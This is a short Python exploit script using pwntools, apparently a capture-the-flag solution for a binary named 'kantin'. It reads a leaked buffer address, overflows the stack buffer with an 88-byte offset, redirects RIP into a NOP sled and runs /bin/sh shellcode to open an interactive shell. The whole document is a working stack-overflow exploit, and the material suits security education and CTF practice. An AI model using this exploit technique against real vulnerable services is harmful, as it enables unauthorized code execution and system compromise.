from pwn import *

context = context(os='linux', arch='amd64'
                  )
if args.REMOTE:
    p = remote('localhost', 1337)
else:
    p = process('./kantin')

offset = 88

shellcode = asm(shellcraft.sh())

# leak buf addr from binary output
p.recvuntil(b"nomor meja kamu: ")
buf_addr = int(p.recvline().strip().rstrip(b")"), 16)

# overwrite RIP to jump into NOP sled past the saved RIP
payload = b"A" * offset
payload += p64(buf_addr + offset + 8 + 10)  # land in NOP sled
payload += b"\x90" * 100
payload += shellcode

p.send(payload)
p.interactive()